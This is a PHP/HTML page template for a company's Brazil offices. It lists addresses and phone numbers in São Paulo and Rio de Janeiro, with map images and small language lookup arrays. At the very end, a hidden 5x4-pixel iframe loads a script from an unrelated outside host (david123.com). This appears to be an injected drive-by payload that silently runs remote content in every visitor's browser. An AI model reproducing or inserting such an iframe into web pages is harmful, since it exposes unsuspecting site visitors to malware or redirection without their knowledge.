<?
	define ('authenticate', false);
	require ('inc/conf.inc.php');
	$socio=$_SESSION['socio'];
	
	$oficinas['esp']='Oficinas en ';
	$oficinas['ing']='Offices in ';
	$oficinas['por']='Offices in ';
	
	$brasil['esp']='Brasil';
	$brasil['ing']='Brazil';
	$brasil['por']='Brazil';
	
?>

<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="estilos<?=$socio?>.css" rel="stylesheet" type="text/css">
</head>

<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td valign="top"><table width="100%" height="20" border="0" cellpadding="0" cellspacing="0">
        <tr> 
          <td height="20" class="nombre"><?=$oficinas[$lng]?>en <?=$brasil[$lng]?></td>
        </tr>
        <tr> 
          <td class="partner">Rua Funchal 263 - 11&ordm; andar</td>
        </tr>
        <tr> 
          <td height="10" class="partner">04551-060 Sao Paulo - Sao Paulo - <?=$brasil[$lng]?> 
          </td>
        </tr>
        <tr> 
          <td height="10" class="partner">Tel.: (55 11) 3089-6500 Fax: (55 11 
            )3089-6565</td>
        </tr>
        <tr> 
          <td class="nombre">&nbsp;</td>
        </tr>
        <tr> 
          <td class="nombre"><img src="images/San-Pablo.jpg" width="312" height="233"></td>
        </tr>
        <tr> 
          <td height="10" class="nombre">&nbsp;</td>
        </tr>
        <tr> 
          <td height="10" class="partner"> Praia de Botafogo - 228 Conj. 604 
          </td>
        </tr>
        <tr>
          <td height="10" class="partner">22250-040 Rio de Janeiro - RJ - <?=$brasil[$lng]?> </td>
        </tr>
        <tr>
          <td height="10" class="partner">Tel (55 21) 2551-4244</td>
        </tr>
        <tr>
          <td height="10" class="nombre">&nbsp;</td>
        </tr>
        <tr> 
          <td class="nombre"><img src="images/Mapa-de-Rio-de-Janeiro.jpg" width="312" height="233"></td>
        </tr>
      </table></td>
  </tr>
</table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
